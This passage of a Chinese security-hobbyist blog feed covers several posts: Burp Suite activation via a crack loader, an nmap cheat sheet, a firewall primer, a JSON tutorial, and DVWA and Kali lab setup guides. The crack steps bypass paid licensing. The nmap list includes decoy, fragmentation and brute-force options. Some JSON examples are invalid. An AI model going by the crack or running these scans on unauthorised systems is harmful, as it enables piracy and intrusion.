title="三.Burpsuit激活"></a>三.Burpsuit激活</h2><p>如果，没有什么问题，打开文件之后点击下一步之后应该是如下图的样子👇。</p><p><img src="/images/wordimage/2022/225/Jihuo.png"></p><h3 id="1-第一步"><a href="#1-第一步" class="headerlink" title="1.第一步"></a>1.第一步</h3><p>打开文件包里面的<code>burploader-old.jar</code>激活工具，然后如下图操作，把激活工具左边的<code>License</code>的代码复制到，Burpsuit的复制页面，然后点击<code>next</code>即可下一步</p><p><img src="/images/wordimage/2022/225/jihuo2.png"></p><h3 id="2-第二步"><a href="#2-第二步" class="headerlink" title="2.第二步"></a>2.第二步</h3><p>点击了next的之后应该是如下图页面的样子👇，然后点击<code>Manual activation</code>，下一步。</p><p><img src="/images/wordimage/2022/225/jihuo3.png"></p><h3 id="3-第三步"><a href="#3-第三步" class="headerlink" title="3.第三步"></a>3.第三步</h3><p>如下图操作，首先下图第一步，把右边的代码复制到左边的<code>Activation Request</code>里面去，然后会在下面的<code>Activation Resphone</code>生成代码，把生成的代码复制到右边的，最小码的框框即可。</p><p><img src="/images/wordimage/2022/225/jihuo4.png"></p><p>然后点击<code>next</code>即可激活，激活成功如下图，如果你遇到什么问题可以留言，评论ヾ(≧▽≦*)o。</p><p><img src="/images/wordimage/2022/225/jihuochenggong.png"></p><hr><p>参考文献</p><p><code>[1]https://blog.csdn.net/nky00000/article/details/119327499</code></p><p><code>[2]https://www.cnblogs.com/hello-cucumber/p/15678730.html</code></p>]]></content>
      
      
      <categories>
          
          <category> 碎知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nmap的基本用法使用</title>
      <link href="/2022/025219fdb7.html"/>
      <url>/2022/025219fdb7.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>nmap是一款渗透测试的常用扫描软件，信息收集软件</p><hr><h2 id="一-使用方法"><a href="#一-使用方法" class="headerlink" title="一.使用方法"></a>一.使用方法</h2><p>常用使用方法如下👇</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">nmap -O IP地址#扫描操作系统nmap -A IP地址#强力扫描 耗时长nmap -sV IP地址#对端口上的服务程序版本进行扫描nmap -sT IP地址#TCP扫描连接 慢 不安全nmap -sS IP地址#SYN扫描 扫描快nmap -Pn IP地址#目标禁用Ping 禁Ping扫描nmap IP地址 -p 端口   #对特点端口进行扫描 也可以扫描多个IP IP地址 -p 0-65535nmap -sA IP地址#扫描那些端口被屏蔽nmap IP地址/24#扫描整个网段主机nmap -T1 IP地址#设置扫描速度，TI-T6，一般T4足矣nmap -f IP地址#使用小数据包发送 避免被识别nmap -sP IP地址#对目标进行Ping检测nmap -D 假IP地址 IP地址 #发送参杂着假的IP地址的数据包检测nmap -sC 脚本 IP地址   #脚本扫描 耗时长nmap -6 IPV6地址#对IPV6地址进行扫描nmap --source-port 端口#针对防火墙允许的端口进行扫描nmap -sn IP地址#对目标进行Ping检测 不进行端口扫描nmap -iL 文件#文件里面全是IP地址，格式是一行一个IP地址nmap IP地址/24 -exclude 排除的IP地址#扫描一个段 排除exclude的IP地址 多个IP可以 --exclude IP1 IP2 IP3nmap --script=auth IP地址#对IP内的应用进行弱口令检测nmap --script=brute IP地址#暴力破解 可以对数据库 SMB SNMP进行简单密码的暴力破解<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上，如果后面还有用的上的可能会补充</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> nmap用法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自建我的世界服务器-欢迎游玩</title>
      <link href="/2022/027644986a.html"/>
      <url>/2022/027644986a.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在寒假闲暇的时候买了一个腾讯云服务器，和小伙伴一起搭建了一个服务器，有各种MOD，比如工业，暮色森林，其中搭建的版本是<code>1.12.2</code>的版本，如果你也想要学习搭建可以看这篇文章👉<a href="https://blog.takagisan.top/2022/02d7aa4d1f.html">我的世界MOD服务器搭建</a>。</p><hr><h2 id="一-介绍"><a href="#一-介绍" class="headerlink" title="一.介绍"></a>一.介绍</h2><p>服务器MOD包含:暮色，神秘，工业，管道，星系，更多箱子，移动世界，达芬奇的船，载具，FTB，修复bug，皮肤，一键砍树等。</p><p>下载地址：<a href="http://img.takagisan.top/MC.zip">http://img.takagisan.top/MC.zip</a></p><p>下载就开玩！欢迎你的到来！</p>]]></content>
      
      
      <categories>
          
          <category> 游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 我的世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识防火墙技术</title>
      <link href="/2022/02d65a8b45.html"/>
      <url>/2022/02d65a8b45.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>突然想要了解防火墙的初步认识，就查了很多资料，发现太官方了，于是就结合自己的理解写出了这篇文章。</p><hr><h2 id="一-什么是防火墙。"><a href="#一-什么是防火墙。" class="headerlink" title="一.什么是防火墙。"></a>一.什么是防火墙。</h2><p> 我自己的理解是，防火墙会过滤检查，来自公网上的所有流量包，比如下载了一个软件，然后Windows自带的防火墙会询问，是否要留住文件，或者删除文件，不确定是否有病毒。</p><p>防火墙可以保护电脑的内部网络，第一个是可以防止病毒的入侵，然后入侵者，必须要经过防火墙这道坎，如果防火墙不允许，那么久根本就进不来，内部网络，举个例子，玛丽亚之墙，出自《进击的巨人》，这个城墙的作用是保护城墙内，抵御城墙外的敌人。</p><p>如果有人想要进来，那么就必须要经过防火墙同意，就可能会绕过方法，比如伪装成为这个城墙里面的人，伪装，之类的。</p><hr><h2 id="二-防火墙系统"><a href="#二-防火墙系统" class="headerlink" title="二.防火墙系统"></a>二.防火墙系统</h2><h3 id="1-屏蔽路由器"><a href="#1-屏蔽路由器" class="headerlink" title="1.屏蔽路由器"></a>1.屏蔽路由器</h3><p>会对每一个到来的IP地址进行检查，如果到来的IP地址里面的信息头里面，有病毒的信息头，然后有禁止的协议，或者禁止的端口号，那么防火墙都会进行过滤，不会让其进来，通俗一点来说，比如，一个乞丐来买房，那么前台人员，肯定会对到来的人员进行，询问，比如你工资多少，能不能付得起首付，如果你付不起肯定不会让你购买，这样来进行人员过滤，防火墙也是这样的，进行特点的规则进行过滤。</p><hr><h3 id="2-代理服务器"><a href="#2-代理服务器" class="headerlink" title="2.代理服务器"></a>2.代理服务器</h3><p>防火墙设置相应的代理服务器，防火墙内网向外网发送数据的时候会携带正确的IP地址信息攻击者能够分局信息数据IP作为追踪的对象，来让病毒进入到内网中，如果使用代理服务器，能实现信息数据IP虚拟化，攻击者就不能获取到真实的信息，从而实现防护的作用。</p><hr><h3 id="3-防病毒技术"><a href="#3-防病毒技术" class="headerlink" title="3.防病毒技术"></a>3.防病毒技术</h3><p>类似于杀毒软件，每次下载完毕软件都会检测这个软件是否有病毒库里面的病毒里面的文件特征，如果有那么就直接过滤，不会让其放行，也会对网络信息和IP地址进行严格检查，等等。</p><hr><h2 id="三-防火墙关键技术"><a href="#三-防火墙关键技术" class="headerlink" title="三.防火墙关键技术"></a>三.防火墙关键技术</h2><p>1.包过滤技术</p><p>2.加密技术</p><p>3.防病毒技术</p><p>4.代理服务器</p><hr><h2 id="四-为什么使用防火墙"><a href="#四-为什么使用防火墙" class="headerlink" title="四.为什么使用防火墙"></a>四.为什么使用防火墙</h2><p>防火墙具有非常好的防护作用，入侵者和网络上的不娘信息必须先要经过防火墙，才能接触到防火墙内部计算机电脑，如果是局域网其实是不需要防火墙的。</p><hr><p>可能后续会补充更多</p><p>参考文献</p><p><code>[1]https://zhuanlan.zhihu.com/p/400995778</code></p><p><code>[2]https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99/52767</code></p>]]></content>
      
      
      <categories>
          
          <category> 计算机技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎知识 </tag>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速了解json和json的用法</title>
      <link href="/2022/02d3d929ba.html"/>
      <url>/2022/02d3d929ba.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>json是一种轻量级别的数据交换格式，B站一个视频我觉得教的非常的好👉<a href="https://www.bilibili.com/video/BV1954y1p7s6?from=search&seid=13105993180442763295&spm_id_from=333.337.0.0">json数据交换格式</a>。</p><hr><h2 id="一-认识Json"><a href="#一-认识Json" class="headerlink" title="一.认识Json"></a>一.认识Json</h2><p>Json一般格式长下面的样子👇，这个是一个最简单的json格式，其中里面的<code>key</code>代表的是键值，然后value1代表的是值</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"key"</span><span class="token operator">:</span> <span class="token string">"value1"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="二-Json的简单使用"><a href="#二-Json的简单使用" class="headerlink" title="二.Json的简单使用"></a>二.Json的简单使用</h2><p>json一般是有很多行数据，比如如下👇，然后用逗号分开。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"key1"</span><span class="token operator">:</span> <span class="token string">"value1"</span><span class="token punctuation">,</span>    <span class="token property">"key2"</span><span class="token operator">:</span> <span class="token string">"value2"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后一般传输是以下格式传输，这样的好处是占用的空间小，节省内存，节省网络传输钟的网络带宽。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"key1"</span><span class="token operator">:</span><span class="token string">"value1"</span><span class="token punctuation">,</span><span class="token property">"key2"</span><span class="token operator">:</span><span class="token string">"value2"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="三-Json的数据类型和访问内容"><a href="#三-Json的数据类型和访问内容" class="headerlink" title="三.Json的数据类型和访问内容"></a>三.Json的数据类型和访问内容</h2><p>其中Json的数据类型有，文本型和数字类型，数字类型的话小数可以，整数可以，负数也可以，没有长度限制，如下👇。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"value"</span><span class="token punctuation">,</span> #文本类型    <span class="token property">"key1"</span><span class="token operator">:</span> <span class="token number">123456</span>#数字类型    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="1-Json对象"><a href="#1-Json对象" class="headerlink" title="1.Json对象"></a>1.Json对象</h3><p>Json里面还有json我的理解是这样的如下👇。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"value"</span><span class="token punctuation">,</span> #文本类型    <span class="token property">"key1"</span><span class="token operator">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>#数字类型    <span class="token property">"key2"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>#Json对象    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Ken"</span><span class="token punctuation">,</span>    <span class="token property">"QQ"</span><span class="token operator">:</span> <span class="token number">2125760270</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="2-数组类型-amp-对象类型数组-amp-空数组"><a href="#2-数组类型-amp-对象类型数组-amp-空数组" class="headerlink" title="2.数组类型&amp;对象类型数组&amp;空数组"></a>2.数组类型&amp;对象类型数组&amp;空数组</h3><p>Json里面有数字型的数组，或者是文本类型的数组，如下👇，或者是一个对象，看下面对象类型数组，是有四个对象，空类型数组就是null，里面什么都没有。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"value"</span><span class="token punctuation">,</span> #文本类型    <span class="token property">"key1"</span><span class="token operator">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>#数字类型    <span class="token property">"key2"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>#Json对象    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Ken"</span><span class="token punctuation">,</span>    <span class="token property">"QQ"</span><span class="token operator">:</span> <span class="token number">2125760270</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"key3"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>#数字型数组<span class="token property">"key4"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">,</span><span class="token string">"d"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>#文本型数组#下面是对象类型的数组<span class="token property">"key5"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>        <span class="token property">"age"</span><span class="token operator">:</span> <span class="token number">18</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span>        <span class="token property">"age"</span><span class="token operator">:</span> <span class="token number">17</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>        <span class="token property">"age"</span><span class="token operator">:</span> <span class="token number">16</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>        <span class="token property">"age"</span><span class="token operator">:</span> <span class="token number">15</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token property">"key6"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="四-取出Json数据里面的数据"><a href="#四-取出Json数据里面的数据" class="headerlink" title="四.取出Json数据里面的数据"></a>四.取出Json数据里面的数据</h2><p>假设我们数据如下👇</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"value"</span><span class="token punctuation">,</span> #文本类型    <span class="token property">"key1"</span><span class="token operator">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>#数字类型    <span class="token property">"key2"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>#Json对象    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Ken"</span><span class="token punctuation">,</span>    <span class="token property">"QQ"</span><span class="token operator">:</span> <span class="token number">2125760270</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"key3"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>#数字型数组<span class="token property">"key4"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">,</span><span class="token string">"d"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>#文本型数组#下面是对象类型的数组<span class="token property">"key5"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>        <span class="token property">"age"</span><span class="token operator">:</span> <span class="token number">18</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span>        <span class="token property">"age"</span><span class="token operator">:</span> <span class="token number">17</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>        <span class="token property">"age"</span><span class="token operator">:</span> <span class="token number">16</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>        <span class="token property">"age"</span><span class="token operator">:</span> <span class="token number">15</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token property">"key6"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1.假设我们要取出key的内容，我们可以直接访问<code>key</code>，就可以取出key的内容<code>value</code>。</p><p>2.如果我们要取出对象类型的数据，比如取出<code>key2</code>里面的数据，可以<code>key2.name</code>就可以取出name，如果我们要取出QQ的内容就可以<code>key2.QQ</code>。</p><p>3.如果我们要取出整数类型的数组，比如这里我想取出<code>key3</code>里面的2这个数字就可以这样<code>key3[1]</code>就可以取出来2这个数字</p><p>4.如果我们要取出文本类型的数组，和上面取出整数的方法一样的，比如要取出<code>key4</code>里面的<code>b</code>这个字符，就可以<code>key4[1]</code>，就可以取出来。</p><p>5.如果我们要取出数组对象，比如我想取出来第一个数组对象的内容，下标是0，所以<code>key5[0].name</code>，就取出来了a，同理，如果我想要取出来c就可以这样<code>key5[2].name</code>就可以取出来c。</p><hr><h2 id="五-Json的字符转义"><a href="#五-Json的字符转义" class="headerlink" title="五.Json的字符转义"></a>五.Json的字符转义</h2><hr><h3 id="1-换行的转义"><a href="#1-换行的转义" class="headerlink" title="1.换行的转义"></a>1.换行的转义</h3><p>有些时候我们需要显示<code>&quot;</code>或者<code>&#39;</code>或者<code>\</code>这样的字符，如果有编程语言基础就知道，<code>\r</code>代表的是换行，<code>\n</code>也代表的是换行，都可以使用，换行在Json里面是不允许的，如果实现文本换行可以使用<code>\r</code>，<code>\n</code>，或者<code>\r\n</code>，即可实现换行。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"QQ"</span><span class="token operator">:</span> <span class="token number">2125760270</span>    <span class="token property">"msg"</span><span class="token operator">:</span><span class="token string">"你好！\r欢迎来到我的博客，\r我是Ken。"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以如果转换成功，显示出来的内容应该是这样的</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">你好!欢迎来到我的博客我是Ken<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="2-引号的转义"><a href="#2-引号的转义" class="headerlink" title="2.引号的转义"></a>2.引号的转义</h3><p>其实转义都可以使用<code>\</code>来进行转义，如下例子👇。双引号的地方，使用了<code>\</code>来进行转义，输出，如果是单引号也可也使用<code>\</code>来进行转义输出，这里就不在赘述。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"QQ"</span><span class="token operator">:</span> <span class="token number">2125760270</span>    <span class="token property">"msg"</span><span class="token operator">:</span><span class="token string">"你好！\"欢迎来到我的博客\"，我是Ken。"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="3-换行符的转义"><a href="#3-换行符的转义" class="headerlink" title="3.换行符的转义"></a>3.换行符的转义</h3><p>如果我就想正常的输出<code>\n</code>不进行转义的操作，也可也使用<code>\</code>来进行转义，如下👇，<code>\r</code>的地方有两个<code>\</code>，这样就可以输出<code>\r</code>了，就不会进行换行了</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"QQ"</span><span class="token operator">:</span> <span class="token number">2125760270</span>    <span class="token property">"msg"</span><span class="token operator">:</span><span class="token string">"你好！\\r欢迎来到我的博客，\\r我是Ken。"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>好像就没有了。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 碎知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场--DVWA靶场安装教程</title>
      <link href="/2022/02306ba7a1.html"/>
      <url>/2022/02306ba7a1.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DVWA靶场是继承了各种常用的web渗透的靶场比如👇</p><p>– SQL注入</p><p>– 文件上传</p><p>– 文件包含</p><p>– 暴力破解</p><p>– XSS</p><p>– 不安全的验证码</p><p>– CSRF</p><hr><h2 id="一-准备工作"><a href="#一-准备工作" class="headerlink" title="一.准备工作"></a>一.准备工作</h2><p>需要去网站下载下皮面板，👉<a href="https://public.xp.cn/upgrades/phpStudy_64.zip">phpstudy小皮面板</a>点击链接直接下载即可，下载完毕，如下图界面👇。</p><p><img src="/images/wordimage/2022/222/XP.png"></p><p>安装mysql和apache之后即可。</p><hr><h2 id="二-下载DVWA"><a href="#二-下载DVWA" class="headerlink" title="二.下载DVWA"></a>二.下载DVWA</h2><p>可以从官网下载，<a href="https://dvwa.co.uk/">官网</a>，也可以从👉<a href="https://github.com/digininja/DVWA/archive/master.zip">直接下载</a>，来直接下载，下载完毕解压之后，内容如下图。</p><p><img src="/images/wordimage/2022/222/DVWAmulu.png"></p><hr><h2 id="三-配置DVWA"><a href="#三-配置DVWA" class="headerlink" title="三.配置DVWA"></a>三.配置DVWA</h2><h3 id="1-更换目录"><a href="#1-更换目录" class="headerlink" title="1.更换目录"></a>1.更换目录</h3><p>打开小皮面板的www目录，然后把文件放入小皮面板的www目录，如下图箭头指示操作即可。</p><blockquote><p>网站 &gt; 管理 &gt; 打开根目录</p></blockquote><p><img src="/images/wordimage/2022/222/xpselect.png"></p><p>然后放入小皮面板的www目录里面，并且重命名为DVWA好管理一点。</p><p><img src="/images/wordimage/2022/222/mulubendi.png"></p><hr><h3 id="2-配置DVWA数据库"><a href="#2-配置DVWA数据库" class="headerlink" title="2.配置DVWA数据库"></a>2.配置DVWA数据库</h3><p>打开DVWA里面的<code>config</code>文件夹里面的<code>config.inc.php</code>如果不是这个名字，自行更改为这个名字，如下图👇。</p><p><img src="/images/wordimage/2022/222/DVWAconfig.png"></p><p>然后打开，文件，如下图修改箭头的内容，就是修改数据库账户和密码即可，数据库账户密码，可以在小皮面板的数据库里面操作查看。</p><p><img src="/images/wordimage/2022/222/DVWADATA.png" alt="修改DVWA账户密码"></p><p>修改完成之后就可以打开了。</p><hr><h2 id="四-配置成功"><a href="#四-配置成功" class="headerlink" title="四.配置成功"></a>四.配置成功</h2><p>默认账户密码分别是</p><blockquote><p>账户:admin</p><p>密码:password</p></blockquote><p>如下图👇</p><p><img src="/images/wordimage/2022/222/DVWApeizhi.png" alt="配置成功"></p><p><img src="/images/wordimage/2022/222/DVWAchenggong.png" alt="进入DVWA页面"></p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> DVWA靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何搭建kali虚拟机--有手就行</title>
      <link href="/2022/02e59b04a1.html"/>
      <url>/2022/02e59b04a1.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Kali虚拟机网安经常来进行渗透测试，不可缺，如下文章，小白都能成功搭建Kali虚拟机，前提是你已经安装好，vm虚拟机和迅雷了，</p><p>如果没有，你可以找我要，或者自行去网上下载</p><h2 id="一-准备任务"><a href="#一-准备任务" class="headerlink" title="一.准备任务"></a>一.准备任务</h2><p>需要去Kali官网下载虚拟机👉<a href="https://www.kali.org/get-kali/#kali-bare-metal">Kali-linux官网</a>，如下图。</p><p><img src="/images/wordimage/2022/222/kalidownload.png" alt="Kali镜像文件下载地址"></p><p>下载完毕之后，直接打开种子文件，迅雷直接下载，下载完毕之后是一个镜像文件，需要自己安装。</p><hr><h2 id="二-安装Kali虚拟机"><a href="#二-安装Kali虚拟机" class="headerlink" title="二.安装Kali虚拟机"></a>二.安装Kali虚拟机</h2><p>下载完毕之后是一个镜像文件，如下图。</p><p><img src="/images/wordimage/2022/222/kaliiso.png"></p><p>然后打开vm虚拟机然后左上角。</p><blockquote><p>文件 &gt; 新建虚拟机</p></blockquote><h3 id="1-选择类型配置"><a href="#1-选择类型配置" class="headerlink" title="1.选择类型配置"></a>1.选择类型配置</h3><p>这里选择的是典型，如下图👇</p><p><img src="/images/wordimage/2022/222/vm.png"></p><h3 id="2-选择系统镜像"><a href="#2-选择系统镜像" class="headerlink" title="2.选择系统镜像"></a>2.选择系统镜像</h3><p>然后如下图，选择浏览如下图👇，找到你Kali ISO文件所在目录，选择即可。</p><p><img src="/images/wordimage/2022/222/anzhuang.png"></p><h3 id="3-选择客户机操作系统"><a href="#3-选择客户机操作系统" class="headerlink" title="3.选择客户机操作系统"></a>3.选择客户机操作系统</h3><p>选择Linux,然后版本选择<code>Debian 10.x 64位</code>，如下图👇</p><p><img src="/images/wordimage/2022/222/system.png"></p><h3 id="4-选择安装位置-amp-amp-虚拟机命名"><a href="#4-选择安装位置-amp-amp-虚拟机命名" class="headerlink" title="4.选择安装位置&amp;&amp;虚拟机命名"></a>4.选择安装位置&amp;&amp;虚拟机命名</h3><p>然后重命名，虚拟机名字，然后选择位置即可。</p><p><img src="/images/wordimage/2022/222/weizhi.png"></p><h3 id="5-指定磁盘大小"><a href="#5-指定磁盘大小" class="headerlink" title="5.指定磁盘大小"></a>5.指定磁盘大小</h3><p>然后配置文件大小这里建议的是60GB，然后将虚拟磁盘存储为单个文件，这个操作的作用是让虚拟机为单个文件，好管理一点，不然文件超级多，如下图配置👇</p><p><img src="/images/wordimage/2022/222/daxiao.png"></p><h3 id="6-配置"><a href="#6-配置" class="headerlink" title="6.配置"></a>6.配置</h3><p>如果没有什么其他需求就可以直接完成操作，如下图👇</p><p><img src="/images/wordimage/2022/222/peizhi.png"></p><h2 id="三-配置Kali虚拟机"><a href="#三-配置Kali虚拟机" class="headerlink" title="三.配置Kali虚拟机"></a>三.配置Kali虚拟机</h2><p>安装完毕之后就可以直接开启了，如下图。</p><p><img src="/images/wordimage/2022/222/kaiqi.png"></p><hr><h3 id="1-安装配置"><a href="#1-安装配置" class="headerlink" title="1.安装配置"></a>1.安装配置</h3><p>这里选择第一个，如下图👇</p><p><img src="/images/wordimage/2022/222/kali1.png"></p><hr><h3 id="2-选择语言"><a href="#2-选择语言" class="headerlink" title="2.选择语言"></a>2.选择语言</h3><p>这里建议选择英语，当然你也可以选择中文凭自己喜好，不然安装完毕切换路径会非常麻烦，如下图👇。</p><p><img src="/images/wordimage/2022/222/yingyu.png"></p><hr><h3 id="3-安装"><a href="#3-安装" class="headerlink" title="3.安装"></a>3.安装</h3><p>然后一路下一步即可，一直到达安装界面如下图👇。</p><p><img src="/images/wordimage/2022/222/inganzhuang.png"></p><hr><h3 id="4-填写主机名"><a href="#4-填写主机名" class="headerlink" title="4.填写主机名"></a>4.填写主机名</h3><p>这里填写主机名也就是root@XX的名字，如下图👇，我这里就默认名字。</p><p><img src="/images/wordimage/2022/222/hostname.png"></p><p>然后一直下一步到填写新用户这里。</p><hr><h3 id="5-安装新用户"><a href="#5-安装新用户" class="headerlink" title="5.安装新用户"></a>5.安装新用户</h3><p>这里是填写第一个用户的，按照你的喜好填入即可如下图👇</p><p><img src="/images/wordimage/2022/222/user.png"></p><hr><h3 id="6-输入密码"><a href="#6-输入密码" class="headerlink" title="6.输入密码"></a>6.输入密码</h3><p>这里是输入的是上面创建的用户密码如下图👇。</p><p><img 